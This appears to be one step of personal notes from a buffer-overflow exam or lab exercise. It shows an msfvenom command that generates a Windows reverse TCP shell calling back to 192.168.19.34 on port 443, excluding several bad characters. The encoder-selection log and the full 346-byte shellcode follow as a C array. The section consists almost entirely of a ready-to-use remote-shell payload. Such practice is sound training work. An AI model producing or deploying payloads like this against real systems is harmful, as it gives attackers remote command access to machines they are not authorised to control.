8. Generate shellcode

Encoding with shikata_ga_nai did not work, so I let msfvenom find a proper encoder

```plaintext
kali@kali:~/gitWorkspace/exam/bf$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.19.34 lport=443 -f c -b "\x00\x04\x76\x77\x99\xf3" exitfunc=thread
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor failed with Encoding failed due to a bad character (index=13, char=0x76)
Attempting to encode payload with 1 iterations of x86/countdown
x86/countdown failed with Encoding failed due to a bad character (index=22, char=0x04)
Attempting to encode payload with 1 iterations of x86/fnstenv_mov
x86/fnstenv_mov succeeded with size 346 (iteration=0)
x86/fnstenv_mov chosen with final size 346
Payload size: 346 bytes
Final size of c file: 1480 bytes
unsigned char buf[] = 
"\x6a\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x6d\xb4"
"\xb3\x9e\x83\xeb\xfc\xe2\xf4\x91\x5c\x31\x9e\x6d\xb4\xd3\x17"
"\x88\x85\x73\xfa\xe6\xe4\x83\x15\x3f\xb8\x38\xcc\x79\x3f\xc1"
"\xb6\x62\x03\xf9\xb8\x5c\x4b\x1f\xa2\x0c\xc8\xb1\xb2\x4d\x75"
"\x7c\x93\x6c\x73\x51\x6c\x3f\xe3\x38\xcc\x7d\x3f\xf9\xa2\xe6"
"\xf8\xa2\xe6\x8e\xfc\xb2\x4f\x3c\x3f\xea\xbe\x6c\x67\x38\xd7"
"\x75\x57\x89\xd7\xe6\x80\x38\x9f\xbb\x85\x4c\x32\xac\x7b\xbe"
"\x9f\xaa\x8c\x53\xeb\x9b\xb7\xce\x66\x56\xc9\x97\xeb\x89\xec"
"\x38\xc6\x49\xb5\x60\xf8\xe6\xb8\xf8\x15\x35\xa8\xb2\x4d\xe6"
"\xb0\x38\x9f\xbd\x3d\xf7\xba\x49\xef\xe8\xff\x34\xee\xe2\x61"
"\x8d\xeb\xec\xc4\xe6\xa6\x58\x13\x30\xdc\x80\xac\x6d\xb4\xdb"
"\xe9\x1e\x86\xec\xca\x05\xf8\xc4\xb8\x6a\x4b\x66\x26\xfd\xb5"
"\xb3\x9e\x44\x70\xe7\xce\x05\x9d\x33\xf5\x6d\x4b\x66\xce\x3d"
"\xe4\xe3\xde\x3d\xf4\xe3\xf6\x87\xbb\x6c\x7e\x92\x61\x24\xf4"
"\x68\xdc\x73\x36\x7e\x96\xdb\x9c\x6d\xb5\x08\x17\x8b\xde\xa3"
"\xc8\x3a\xdc\x2a\x3b\x19\xd5\x4c\x4b\xe8\x74\xc7\x92\x92\xfa"
"\xbb\xeb\x81\xdc\x43\x2b\xcf\xe2\x4c\x4b\x05\xd7\xde\xfa\x6d"
"\x3d\x50\xc9\x3a\xe3\x82\x68\x07\xa6\xea\xc8\x8f\x49\xd5\x59"
"\x29\x90\x8f\x9f\x6c\x39\xf7\xba\x7d\x72\xb3\xda\x39\xe4\xe5"
"\xc8\x3b\xf2\xe5\xd0\x3b\xe2\xe0\xc8\x05\xcd\x7f\xa1\xeb\x4b"
"\x66\x17\x8d\xfa\xe5\xd8\x92\x84\xdb\x96\xea\xa9\xd3\x61\xb8"
"\x0f\x53\x83\x47\xbe\xdb\x38\xf8\x09\x2e\x61\xb8\x88\xb5\xe2"
"\x67\x34\x48\x7e\x18\xb1\x08\xd9\x7e\xc6\xdc\xf4\x6d\xe7\x4c"
"\x4b";
```


![9644621a14b5454c9a2773c794417f58.png](../../../_resources/33eff446dffe42379bf3a8d894db7188.png)

![f38f24deba2a7f77af4902334333fee4.png](../../../_resources/c19bf44f5d464e14ac135da80d209a01.png)









